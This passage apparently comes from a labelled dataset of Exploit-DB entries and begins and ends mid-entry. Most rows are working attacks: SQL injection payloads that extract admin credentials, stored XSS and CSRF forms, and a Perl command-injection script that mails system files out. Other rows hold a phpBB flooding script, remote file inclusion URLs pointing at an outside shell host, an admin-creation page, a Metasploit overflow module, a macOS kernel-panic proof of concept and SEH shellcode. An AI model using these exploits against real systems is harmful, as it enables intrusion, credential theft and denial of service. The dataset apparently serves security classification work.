passwords, for example:  <DATA ownername=""NULL"" password=""C70A0eE9os9T2z"" username=""root""/>   These passwords can be decoded trivially. The algorithm used can be found in the JAR file NmsServerClasses.jar. For example the encoded password C70A0eE9os9T2z decodes to SECURIFY123. The credentials stored in these files can than be used to gain privileged access to devices managed by Command Center.",Credential Disclosure Abstract,1
31154,"Counter Strike Portals - 'download' SQL Injection source: https://www.securityfocus.com/bid/27747/info  Counter Strike Portals is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/index.php?page=downloads&mode=details&id=-1/**/union/**/select/**/0,member_nick,111,member_pass,222,333,444,555,666/**/from/**/tbl_member/*",SQL Injection,1
46320,"BEWARD N100 H.264 VGA IP Camera M2.1.6 - Arbitrary File Disclosure BEWARD N100 H.264 VGA IP Camera M2.1.6 Arbitrary File Disclosure  Vendor: Beward R&D Co., Ltd Product web page: https://www.beward.net Affected version: M2.1.6.04C014  Summary: The N100 compact color IP camera with support for a more efficient compression format is optimized for low-speed networks, thanks to which it transmits a real-time image over the network with minimal delays. The camera supports the switching of the broadcast modes, and in the event of a break in communication with the remote file storage, it can continue recording to the microSDHC memory card. N100 is easy to install and configure, has all the necessary arsenal for the organization of low-cost professional video surveillance systems.  Desc: The camera suffers from an authenticated file disclosure vulnerability. Input passed via the 'READ.filePath' parameter in fileread script is not properly verified before being used to read files. This can be exploited to disclose the contents of arbitrary files via absolute path or via the SendCGICMD API.  Tested on: Boa/0.94.14rc21            Farady ARM Linux 2.6   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2019-5511 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5511.php   26.01.2019   -- From the term: -- root@ground:~# curl -H ""Authorization: Basic YWRtaW46YWRtaW4="" http://TARGET/cgi-bin/operator/fileread?READ.filePath=/etc/passwd root:x:0:0:root:/root:/bin/sh bin:x:1:1:bin:/bin:/bin/sh daemon:x:2:2:daemon:/usr/sbin:/bin/sh adm:x:3:4:adm:/adm:/bin/sh lp:x:4:7:lp:/var/spool/lpd:/bin/sh sync:x:5:0:sync:/bin:/bin/sync shutdown:x:6:11:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt uucp:x:10:14:uucp:/var/spool/uucp:/bin/sh operator:x:11:0:Operator:/var:/bin/sh nobody:x:99:99:nobody:/home:/bin/sh  -- From the web console: -- SendCGICMD(""cgi-bin/operator/fileread?READ.filePath=/etc/passwd"") root:x:0:0:root:/root:/bin/sh bin:x:1:1:bin:/bin:/bin/sh daemon:x:2:2:daemon:/usr/sbin:/bin/sh adm:x:3:4:adm:/adm:/bin/sh lp:x:4:7:lp:/var/spool/lpd:/bin/sh sync:x:5:0:sync:/bin:/bin/sync shutdown:x:6:11:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt uucp:x:10:14:uucp:/var/spool/uucp:/bin/sh operator:x:11:0:Operator:/var:/bin/sh nobody:x:99:99:nobody:/home:/bin/sh  -- SendCGICMD(""cgi-bin/operator/fileread?READ.filePath=/etc/issue"") -- Welcome to \n (\m-\s-\r@\l/\b) Faraday ARM Linux 2.6  Copyright (C) 2005 Faraday Corp. <www.faraday.com.tw> Released under GNU GPL  -- wr: /usr/share/www/html sp: /var/www/secret.passwd bc: /etc/boa.conf",authenticated file disclosure,1
47979,"Fifthplay S.A.M.I 2019.2_HP - Persistent Cross-Site Scripting # Exploit Title: Fifthplay S.A.M.I 2019.2_HP - Persistent Cross-Site Scripting # Date: 2020-01-29 # Exploit Author: LiquidWorm # Vendor: Fifthplay NV # Vendor Homepage: https://www.fifthplay.com # Version: 2019.2_HP # Tested on: Linux # CVE : -  Fifthplay S.A.M.I - Service And Management Interface Unauthenticated Stored XSS   Vendor: Fifthplay NV Product web page: https://www.fifthplay.com Affected version: Platform: HAM V1.2                             HAM V1.1                             HAM V1.0                             DINHAM 10W                   Image Version: 2019.3-20190605144803                                  2019.2_HP-20190808154634                                  2018.4_HP-20181015152950                                  2018.2-20180516100815                                  2017.2_HP-20180213083050                                  2013.4_HP-201309301203                   AMP Version: 2019.2_HP                                2018.4_HP                                2017.2_HP                                2013.4_HP                                R20.19.03                                R20.18.02                   Fix: 2017.2-HP4                        2018.4_HP3                        2018.5_HP7                        2019.2_HP3                        2019.3_HP1  Summary: Fifthplay is a Belgian high-tech player and a subsidiary of Niko Group.  We specialise in enriching smart homes and buildings for almost 10 years, and in services that provide comfort and energy. Our gateway provides a modular approach to integrating old and new technologies, such as smart meters, optical meters, sockets, switches. Fifthplay is a trendsetter with regards to smart homes and buildings and one of the sector's most innovative companies.  Desc: The application suffers from an unauthenticated stored XSS through POST request. The issue is triggered when input passed via several parameters is not properly sanitized before being returned to the user. This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of an affected site. The application interface also allows users to perform certain actions via HTTP requests without performing any validity checks to verify the requests. This can be exploited to perform certain actions if a user visits a malicious web site.  Tested on: lighttpd/1.4.33            PHP/5.4.33            PHP/5.3.19   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2020-5561 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5561.php   29.09.2019  --   Stored XSS: -----------  <html>   <body>     <form action=""http://192.168.11.1/?page=networksettings"" method=""POST"">       <input type=""hidden"" name=""server"" value='""><script>prompt(251)</script>' />       <input type=""hidden"" name=""port"" value='""><script>prompt(252)</script>' />       <input type=""hidden"" name=""auth"" value=""1"" />       <input type=""hidden"" name=""user"" value='""><script>prompt(253)</script>' />       <input type=""hidden"" name=""pass"" value='""><script>prompt(254)</script>' />       <input type=""hidden"" name=""submit"" value=""Change"" />       <input type=""submit"" value=""Write"" />     </form>   </body> </html>   Set proxy CSRF: --------------- <html>   <body>     <form action=""http://192.168.11.1/?page=networksettings"" method=""POST"">       <input type=""hidden"" name=""server"" value=""proxy.segfault.mk"" />       <input type=""hidden"" name=""port"" value=""8080"" />       <input type=""hidden"" name=""auth"" value=""1"" />       <input type=""hidden"" name=""user"" value=""testuser"" />       <input type=""hidden"" name=""pass"" value=""testpass"" />       <input type=""hidden"" name=""submit"" value=""Change"" />       <input type=""submit"" value=""Write"" />     </form>   </body> </html>   Delete proxy CSRF: ------------------  <html>   <body>     <form action=""http://192.168.11.1/?page=networksettings"" method=""POST"">       <input type=""hidden"" name=""server"" value=""proxy.segfault.mk"" />       <input type=""hidden"" name=""port"" value=""8080"" />       <input type=""hidden"" name=""auth"" value=""1"" />       <input type=""hidden"" name=""user"" value=""testuser"" />       <input type=""hidden"" name=""pass"" value=""testpass"" />       <input type=""hidden"" name=""delete"" value=""Delete"" />       <input type=""submit"" value=""Clear"" />     </form>   </body> </html>",Persistent Cross-Site Scripting,1
36046,phpWebSite - 'page_id' Cross-Site Scripting source: https://www.securityfocus.com/bid/49176/info  phpWebSite is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   http://www.example.com/mod.php?mod=userpage&page_id=[XSS],Cross-Site Scripting,1
20583,"textcounter.pl 1.2 - Arbitrary Command Execution source: https://www.securityfocus.com/bid/2265/info  textcounter.pl is distributed through Matt's Scripts archive, and provides added features to httpd servers such as counters, guestbooks, and http cookie management. Due to insufficient checking of entered characters, it is possible for a remote user to input custom formatted strings into the $DOCUMENT_URI environment variable which, which when parsed can be executed as the UID of the httpd process. This makes it possible for a user with malicious intentions to execute arbitrary commands, and potentially gain access to the local host.   #!/usr/bin/perl  $URL='http://dtp.kappa.ro/a/test.shtml';    # please _DO_ _modify_ this  $EMAIL='pdoru@pop3.kappa.ro,root';          # please _DO_ _modify_ this   if ($ARGV[0]) {    $CMD=$ARGV[0]; }else{    $CMD=""(ps ax;cd ..;cd ..;cd ..;cd etc;cat hosts;set)\|mail ${EMAIL} -sanothere_one""; }  $text=""${URL}/;IFS=\8;${CMD};echo|""; $text =~ s/ /\$\{IFS\}/g;  #print ""$text\n"";  system({""wget""} ""wget"", $text, ""-O/dev/null""); system({""wget""} ""wget"", $text, ""-O/dev/null""); #system({""lynx""} ""lynx"", $text);  #system({""lynx""} ""lynx"", $text);     # if you don't have ""wget""                                   # you can try with ""Lynx""",Arbitrary Command Execution,1
31494,Quick Classifieds 1.0 - 'controlpannel/alterHomepage.php3?DOCUMENT_ROOT' Remote File Inclusion source: https://www.securityfocus.com/bid/28417/info                 Quick Classifieds is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.                 Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.                 Quick Classifieds 1.0 is vulnerable; other versions may also be affected.   http://www.example.com/QuickSystems_path/controlpannel/alterHomepage.php3?DOCUMENT_ROOT=ZoRLu.txt?,remote file-include vulnerabilities,1
1063,"phpBB 2.0.15 - Register Multiple Users (Denial of Service) (Perl) #!/usr/bin/perl ##  Name: NsT-phpBBDoS (Perl Version) ##  Copyright: Neo Security Team ##  Author: HaCkZaTaN ##  Ported: g30rg3_x ##  Date: 20/06/05 ##  Description: NsT-phpBB DoS By HackZatan Ported tu perl By g30rg3_x ##               A Simple phpBB Registration And Search DoS Flooder. ##  ##  g30rg3x@neosecurity:/home/g30rg3x# perl NsT-phpBBDoS.pl ##  [+]  ##  [+] NsT-phpBBDoS v0.2 by HaCkZaTaN ##  [+] ported to Perl By g30rg3_x ##  [+] Neo Security Team ##  [+] ##  [+] Host |without http://www.| victimshost.com ##  [+] Path |example. /phpBB2/ or /| /phpBB2/ ##  [+] Flood Type |1=Registration 2=Search| 1 ##  [+] .......................................................... ##  [+] .......................................................... ##  [+] .......................................................... ##  [+] .............................................. ##  [+] The Socket Can't Connect To The Desired Host or the Host is MayBe DoSed ##  g30rg3x@neosecurity:/home/g30rg3x# echo ""Let see how many users I have created""  use IO::Socket;  ## Initialized X $x = 0;  ## Flood Variables Provided By User print q( NsT-phpBBDoS v0.2 by HaCkZaTaN ported to Perl By g30rg3_x Neo Security Team  ); print q(Host |without http://www.| ); $host = <STDIN>; chop ($host);  print q(Path |example. /phpBB2/ or /| ); $pth = <STDIN>; chop ($pth);  print q(Flood Type |1 = Registration, 2 = Search| ); $type = <STDIN>; chop ($type);  ## If Type Is Equals To 1 or Registration if($type == 1){  ## User Loop for 9999 loops (enough for Flood xDDDD) while($x != 9999) {  ## Building User in base X $uname = ""username=NsT__"" . ""$x"";  ## Building User Mail in base X $umail = ""&email=NsT__"" . ""$x"";  ## Final String to Send $postit = ""$uname"".""$umail"".""%40neosecurityteam.net&new_password=0123456&password_confirm=0123456&icq=&aim=N%2FA&msn=&yim=&website=&location=&occupation=&interests=&signature=&viewemail=0&hideonline=0&notifyreply=0&notifypm=1&popup_pm=1&attachsig=1&allowbbcode=1&allowhtml=0&allowsmilies=1&language=english&style=2&timezone=0&dateformat=D+M+d%2C+Y+g%3Ai+a&mode=register&agreed=true&coppa=0&submit=Submit"";  ## Posit Length $lrg = length $postit;  ## Connect Socket with Variables Provided By User my $sock = new IO::Socket::INET (                                  PeerAddr => ""$host"",                                  PeerPort => ""80"",                                  Proto => ""tcp"",                                 ); die ""\nThe Socket Can't Connect To The Desired Host or the Host is MayBe DoSed: $!\n"" unless $sock;  ## Sending Truth Socket The HTTP Commands For Register a User in phpBB Forums print $sock ""POST $pth"".""profile.php HTTP/1.1\n""; print $sock ""Host: $host\n""; print $sock ""Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\n""; print $sock ""Referer: $host\n""; print $sock ""Accept-Language: en-us\n""; print $sock ""Content-Type: application/x-www-form-urlencoded\n""; print $sock ""Accept-Encoding: gzip, deflate\n""; print $sock ""User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\n""; print $sock ""Connection: Keep-Alive\n""; print $sock ""Cache-Control: no-cache\n""; print $sock ""Content-Length: $lrg\n\n""; print $sock ""$postit\n""; close($sock);  ## Print a ""."" for every loop syswrite STDOUT, ""."";  ## Increment X in One for every Loop  $x++; }  ## If Type Is Equals To 2 or Search } elsif ($type == 2){  ## User Search Loop for 9999 loops (enough for Flood xDDDD) while($x != 9999) { ## Final Search String to Send $postit = ""search_keywords=Neo+Security+Team+Proof+of+Concept+$x+&search_terms=any&search_author=&search_forum=-1&search_time=0&search_fields=msgonly&search_cat=-1&sort_by=0&sort_dir=ASC&show_results=posts&return_chars=200"";  ## Posit Length $lrg = length $postit;  ## Connect Socket with Variables Provided By User my $sock = new IO::Socket::INET (                                  PeerAddr => ""$host"",                                  PeerPort => ""80"",                                  Proto => ""tcp"",                                 ); die ""\nThe Socket Can't Connect To The Desired Host or the Host is MayBe DoSed: $!\n"" unless $sock;  ## Sending Truth Socket The HTTP Commands For Send A BD Search Into phpBB Forums print $sock ""POST $pth"".""search.php?mode=results HTTP/1.1\n""; print $sock ""Host: $host\n""; print $sock ""Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\n""; print $sock ""Referer: $host\n""; print $sock ""Accept-Language: en-us\n""; print $sock ""Content-Type: application/x-www-form-urlencoded\n""; print $sock ""Accept-Encoding: gzip, deflate\n""; print $sock ""User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\n""; print $sock ""Connection: Keep-Alive\n""; print $sock ""Cache-Control: no-cache\n""; print $sock ""Content-Length: $lrg\n\n""; print $sock ""$postit\n""; close($sock);  ## Print a ""."" for every loop syswrite STDOUT, ""."";  ## Increment X in One for every Loop $x++; } }else{ ## STF??? What Do You Type 	die ""Option not Allowed O_o???\n""; }  # milw0rm.com [2005-06-22]",Register Multiple Users,1
5185,"PORAR WebBoard - 'question.asp' SQL Injection   ##     ##         ##   ##           ## ##      ###CoRPITX       ###          ## ##    ##   ##   ##     ##  ########################### Turkey #################################### #                                                                     # #################### www.Hayalet-hack.com ############################# # ##################### www.zone-turk.net/############################### #              #            PORAR WEBBOARD SQL Injection Vulnerability  # ####################################################################### #   #  AUTHOR : xcorpitx # #  HOME   : www.Hayalet-hack.com / www.zone-turk.net # #  email  : xcorpitx@hotmail.com # ######################################################################## #  This (SQL) give  Admin name and Admin password  #  Bu sorgu direk admin ismi ve  sisresini verecektir ######################################################################## # #  DorK   : '' webboard question.asp QID'' # ######################################################################## #             #  EXPLOIT:  # ######################################################################## # example 1  : columns number 10 # question.asp?QID=-1122334455%20+%20union%20+%20select%20+%200,null,2,username,password,5,password,7,8,9,null%20+%20from%20+%20+%20administrator%20';'; ######################################################################### # some tÃ½mes thÃ½s sql # example 2 : columns number 11 # question.asp?QID=-1%20+%20union%20+%20select%20+%200,1,2,username,4,5,password,7,8,9,10,11%20+%20from%20+%20+%20administrator%20';'; ######################################################################### # admin login # http://www.xxx.com/webboard/admin/login.asp # ########################################################################  Thanx : str0ke,D3ng3s!z,Pc faresi,Hayalet,Turque,SmoKin,Apex,Mostbiq  have nice day and hack   i m sory jane  :(    Kankilerim   D3ng3s!z ve Pc faresi ne sevgiler  el sallayin :S  # milw0rm.com [2008-02-25]",SQL Injection,1
22803,"Kerio MailServer 5.6.3 do_map Module - Overflow source: https://www.securityfocus.com/bid/7967/info     Multiple buffer overrun vulnerabilities have been discovered in Kerio MailServer, which affect the webmail component. The problem occurs when handling usernames of excessive length and likely occurs due to insufficient bounds checking. Due to the similarity of these issues it has been conjectured that the root of the problem may be a single function used to handle all affected procedures.     Successful exploitation of this vulnerability could potentially result in the execution of arbitrary code, with the privileges of the Kerio MailServer process.  http://[Server]/do_map? action=new&oldalias=eso&alias=aaa&folder=public&user=AAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAA",buffer overrun,1
23988,"Nuked-klaN 1.x - Multiple Vulnerabilities source: https://www.securityfocus.com/bid/10104/info  Nuked-Klan is prone to multiple vulnerabilities. These issues include information disclosure via inclusion of local files, an issue that may permit remote attackers to corrupt configuration files and an SQL injection vulnerability.  - To include a local file:  http://www.example.com/index.php?user_langue=../../../../../file/to/view  - Create admin (overwriting GLOBALS) :  -------------------------------------------------------  <html> <head> <title>Nuked-KlaN b1.5 Create Admin</title> </head> <body> <? function ascii_sql($str) { for ($i=0;$i < strlen($str);$i++) { if ($i == strlen($str)-1){ $ascii_char.=ord(substr($str,$i)); }else{ $ascii_char.=ord(substr($str,$i)).','; } } return $ascii_char; }  if (isset($_POST[""submit""])){  echo ""<script>url='"".$target.""/index.php? file=Suggest&op=add_sug&user_langue=../globals.php&nuked[prefix]=nuked_users%20 (id,pseudo,pass,niveau)%20VALUES%20(12345,char("".ascii_sql($_POST [""pseudo""]).""),md5(char("".ascii_sql($_POST [""pass""])."")),9)/*&module=Gallery';window.open(url);</script>""; echo ""<br><br><br><br>Admin should have been created."";  }else{ ?>  <form method=""POST"" action=""<? echo $PHP_SELF; ?>""> <b>Target :</b> <input type=""text"" name=""target"" value=""http://""><br> <b>Admin Nick :</b> <input type=""text"" name=""pseudo""><br> <b>Admin Pass :</b> <input type=""text"" name=""pass""><br> <input type=""submit"" name=""submit"" value=""Create Admin""> </form> <? } ?> </body> </html> -------------------------------------------------------",SQL injection,1
45891,"Apple macOS 10.13 - 'workq_kernreturn' Denial of Service (PoC) /* # Exploit Title: MacOS 10.13 - 'workq_kernreturn' Denial of Service (PoC) # Date: 2018-07-30 # Exploit Author: Fabiano Anemone # Vendor Homepage: https://www.apple.com/ # Version: iOS 11.4.1 / MacOS 10.13.6 # Tested on: iOS / MacOS # CVE: Not assigned # Tweet: https://twitter.com/anoane/status/1048549170217451520  # iOS 11 / MacOS 10.13 - workq_kernreturn syscall local DoS # workq_kernreturn_dos.c # workq_kernreturn_dos # Created by FABIANO ANEMONE (@ on 7/30/18. # Copyright © 2018 FABIANO ANEMONE (fabiano.anemone@gmail.com). All rights reserved. # Reported to product-security@apple.com on 7/30/18 # Fixed in Mojave. */  #include <stdio.h> #include <unistd.h> #include <sys/syscall.h> #include <sys/errno.h>  #define WQOPS_THREAD_WORKLOOP_RETURN 0x100    /* parks the thread after delivering the passed kevent array */  int workq_kernreturn(int options, user_addr_t item, int affinity, int prio) {     return syscall(SYS_workq_kernreturn, options, item, affinity, prio); }  int main(int argc, const char * argv[]) {     //short version that fits one tweet:     //syscall(368,256,1,1);          errno = 0;     user_addr_t any_non_zero_address = 1;     int res = workq_kernreturn(WQOPS_THREAD_WORKLOOP_RETURN, any_non_zero_address, 1, 0);     // MacOS 10.13.X and iOS 11.X will panic at this point     printf(""workq_kernreturn: %d - res: %d - errno: %d\n"", 0, res, errno);     return 0; }",Denial of Service,1
10531,"jCore CMS - Cross-Site Scripting Found: loneferret Vendor: jCore Site: http://www.jcore.net/home Software link: http://www.jcore.net/downloads  Search page is vulnerable to cross-site scripting.  Exploit: http://server/modules/search?search=[xss here] http://server/modules/search?search=</a>[xss here]  Example: The result page will screw up. Hit the back button and you newly created submit input type will be there. Fully functional. http://server/modules/search?search=</a><input value=""xss"" onclick=""alert(1)"" type=""submit"">",Cross-Site Scripting,1
40962,"OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1010  This issue affects OpenSSH if privilege separation is disabled (config option UsePrivilegeSeparation=no). While privilege separation is enabled by default, it is documented as a hardening option, and therefore disabling it should not directly make a system vulnerable.  OpenSSH can forward TCP sockets and UNIX domain sockets. If privilege separation is disabled, then on the server side, the forwarding is handled by a child of sshd that has root privileges. For TCP server sockets, sshd explicitly checks whether an attempt is made to bind to a low port (below IPPORT_RESERVED) and, if so, requires the client to authenticate as root. However, for UNIX domain sockets, no such security measures are implemented.  This means that, using ""ssh -L"", an attacker who is permitted to log in as a normal user over SSH can effectively connect to non-abstract unix domain sockets with root privileges. On systems that run systemd, this can for example be exploited by asking systemd to add an LD_PRELOAD environment variable for all following daemon launches and then asking it to restart cron or so. The attached exploit demonstrates this - if it is executed on a system with systemd where the user is allowed to ssh to his own account and where privsep is disabled, it yields a root shell.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40962.zip",Forwarded Unix Domain Sockets Privilege Escalation,1
12194,"Police Municipale Open Main Courante 1.01beta - Local File Inclusion / Remote File Inclusion =========================================================================================== Police Municipale Open Main Courante 1.01beta (RFI/LFI) Multiple File Include Vulnerability ===========================================================================================  [+] Police Municipale Open Main Courante 1.01beta (RFI/LFI) Multiple File Include Vulnerability  1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0 0     _                   __           __       __                     1 1   /' \            __  /'__`\        /\ \__  /'__`\                   0 0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1 1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0 0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1 1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0 0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1 1                  \ \____/ >> Exploit database separated by exploit   0 0                   \/___/          type (local, remote, DoS, etc.)    1 1                                                                      1 0  [+] Site            : Inj3ct0r.com                                  0 1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1 0                                                                      0 1                    ######################################            1 0                    I'm cr4wl3r  member from Inj3ct0r Team            1 1                    ######################################            0 0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1  [+] Discovered By: cr4wl3r [+] Greetz: All member inj3ct0r.com, manadocoding.net, sekuritionline.net, gcc.web.id  [+] Thanks to: str0ke, opt!x hacker, xoron, cyberlog, irvian, antihack, angky.tatoki,                 EA ngel, zvtral, s4va, bL4Ck_3n91n3, untouch, team_elite, zreg, mywisdom,                 SENOT, kec0a, d3viln3t, p4p4y, cybertomat, etaxCrew, emen, and all my friend  [+] PoC:  [~] RFI: http://shell4u.tk/[path]/gen/obj/affectation.class.php?path_om[Shell] http://shell4u.tk/[path]/gen/obj/categorie.class.php?path_om[Shell] http://shell4u.tk/[path]/gen/obj/maincourante.class.php?path_om[Shell] http://shell4u.tk/[path]/gen/obj/planning.class.php?path_om[Shell] http://shell4u.tk/[path]/gen/obj/utilisateur.class.php?path_om[Shell] http://shell4u.tk/[path]/gen/obj/affectationportable.class.phpp?path_om[Shell] http://shell4u.tk/[path]/gen/obj/collectivite.class.php?path_om[Shell] http://shell4u.tk/[path]/gen/obj/mission.class.php?path_om[Shell] http://shell4u.tk/[path]/gen/obj/portable.class.php?path_om[Shell] http://shell4u.tk/[path]/gen/obj/vehicule.class.php?path_om[Shell] http://shell4u.tk/[path]/gen/obj/affectationvehicule.class.php?path_om[Shell] http://shell4u.tk/[path]/gen/obj/droit.class.php?path_om[Shell] http://shell4u.tk/[path]/gen/obj/nature.class.php?path_om[Shell] http://shell4u.tk/[path]/gen/obj/profil.class.php?path_om[Shell] http://shell4u.tk/[path]/gen/obj/agent.class.php?path_om[Shell] http://shell4u.tk/[path]/gen/obj/intervention.class.php?path_om[Shell] http://shell4u.tk/[path]/gen/obj/periode.class.php?path_om[Shell] http://shell4u.tk/[path]/gen/obj/urgence.class.php?path_om[Shell]  [~] LFI: http://shell4u.tk/[path]/scr/soustab.php?dsn[phptype]=[LFI%00]",Remote File Inclusion,1
16714,"Oracle 9i XDB (Windows x86) - FTP UNLOCK Overflow (Metasploit) ## # $Id: oracle9i_xdb_ftp_unlock.rb 10559 2010-10-05 23:41:17Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GreatRanking  	include Msf::Exploit::Remote::Ftp 	include Msf::Exploit::Remote::Seh  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Oracle 9i XDB FTP UNLOCK Overflow (win32)', 			'Description'    => %q{ 					By passing an overly long token to the UNLOCK command, a 				stack based buffer overflow occurs. David Litchfield, has 				illustrated multiple vulnerabilities in the Oracle 9i XML 				Database (XDB), during a seminar on ""Variations in exploit 				methods between Linux and Windows"" presented at the Blackhat 				conference. Oracle9i includes a number of default accounts, 				including dbsnmp:dbsmp, scott:tiger, system:manager, and 				sys:change_on_install. 			}, 			'Author'         => [ 'MC', 'David Litchfield <david@ngssoftware.com>' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 10559 $', 			'Platform'       => [ 'win' ], 			'References'     => 				[ 					[ 'CVE', '2003-0727'], 					[ 'OSVDB', '2449'], 					[ 'BID', '8375'], 					[ 'URL', 'http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf'], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'thread', 				}, 			'Privileged'     => true, 			'Payload'        => 				{ 					'Space'    => 800, 					'BadChars' => ""\x00\x20\x0a\x0d"", 					'StackAdjustment' => -3500, 				}, 			'Targets'        => 				[ 					[ 						'Oracle 9.2.0.1 Universal', 						{ 							'Ret'      => 0x60616d46, # oraclient9.dll (pop/pop/ret) 						}, 					], 				], 			'DisclosureDate' => 'Aug 18 2003', 			'DefaultTarget' => 0))  		register_options([ 			Opt::RPORT(2100), 			OptString.new('FTPUSER', [ false, 'The username to authenticate as', 'DBSNMP']), 			OptString.new('FTPPASS', [ false, 'The password to authenticate with', 'DBSNMP']), 		], self.class ) 	end  	def check 		connect 		disconnect 		if (banner =~ /9\.2\.0\.1\.0/) 			return Exploit::CheckCode::Vulnerable 		end 		return Exploit::CheckCode::Safe 	end  	def exploit 		connect_login  		print_status(""Trying target #{target.name}..."")  		buf = rand_text_english(1130, payload_badchars) 		seh = generate_seh_payload(target.ret) 		buf[322, seh.length] = seh  		send_cmd( ['UNLOCK', '/', buf] , false )  		handler 		disconnect 	end  end",FTP UNLOCK Overflow,1
36920,"Mediacoder 0.8.34.5716 - '.m3u' Local Buffer Overflow (SEH) #!/usr/bin/python # Exploit Title: Mediacoder 0.8.34.5716 Buffer Overflow SEH Exploit (.m3u) # Date: 05/May/2015 # Author: @evil_comrade IRC freenode: #vulnhub or #offsec or #corelan # email: kwiha2003 [at ]yahoo [dot] com  # Version: 0.8.34.5716 # Tested on: Win XP3 # Vendor: http://www.mediacoderhq.com/ # Software link: http://www.mediacoderhq.com/getfile.htm?site=mediacoder.info&file=MediaCoder-0.8.34.5716.exe  # Greetz: b33f,corelan,offsec,vulnhub,HUST510 # Notes: Due to insifficient space after taking control of the EIP, you have to jump backwards and also  #        avoid a few bad bytes after the ""A""s.  #!/usr/bin/python buffersize = 853 buffer = (""http://"" + ""\x41"" * 256) #Space for shellcode to decode buffer += ""\x90"" * 24 # msfpayload windows/exec CMD=calc R|msfencode -b ""\x00\x0a\x0d\x20"" -t c -e x86/shikata_ga_nai #[*] x86/shikata_ga_nai succeeded with size 223 (iteration=1) #unsigned char buf[] =  buffer +=(""\xdd\xc1\xbd\xc4\x15\xfd\x3a\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"" ""\x32\x31\x6f\x17\x03\x6f\x17\x83\x2b\xe9\x1f\xcf\x4f\xfa\x69"" ""\x30\xaf\xfb\x09\xb8\x4a\xca\x1b\xde\x1f\x7f\xac\x94\x4d\x8c"" ""\x47\xf8\x65\x07\x25\xd5\x8a\xa0\x80\x03\xa5\x31\x25\x8c\x69"" ""\xf1\x27\x70\x73\x26\x88\x49\xbc\x3b\xc9\x8e\xa0\xb4\x9b\x47"" ""\xaf\x67\x0c\xe3\xed\xbb\x2d\x23\x7a\x83\x55\x46\xbc\x70\xec"" ""\x49\xec\x29\x7b\x01\x14\x41\x23\xb2\x25\x86\x37\x8e\x6c\xa3"" ""\x8c\x64\x6f\x65\xdd\x85\x5e\x49\xb2\xbb\x6f\x44\xca\xfc\x57"" ""\xb7\xb9\xf6\xa4\x4a\xba\xcc\xd7\x90\x4f\xd1\x7f\x52\xf7\x31"" ""\x7e\xb7\x6e\xb1\x8c\x7c\xe4\x9d\x90\x83\x29\x96\xac\x08\xcc"" ""\x79\x25\x4a\xeb\x5d\x6e\x08\x92\xc4\xca\xff\xab\x17\xb2\xa0"" ""\x09\x53\x50\xb4\x28\x3e\x3e\x4b\xb8\x44\x07\x4b\xc2\x46\x27"" ""\x24\xf3\xcd\xa8\x33\x0c\x04\x8d\xcc\x46\x05\xa7\x44\x0f\xdf"" ""\xfa\x08\xb0\x35\x38\x35\x33\xbc\xc0\xc2\x2b\xb5\xc5\x8f\xeb"" ""\x25\xb7\x80\x99\x49\x64\xa0\x8b\x29\xeb\x32\x57\xae"") buffer += ""\x42"" * 350 nseh = ""\xEB\x06\x90\x90"" # 0x660104ee : pop edi # pop ebp # ret  | [libiconv-2.dll]  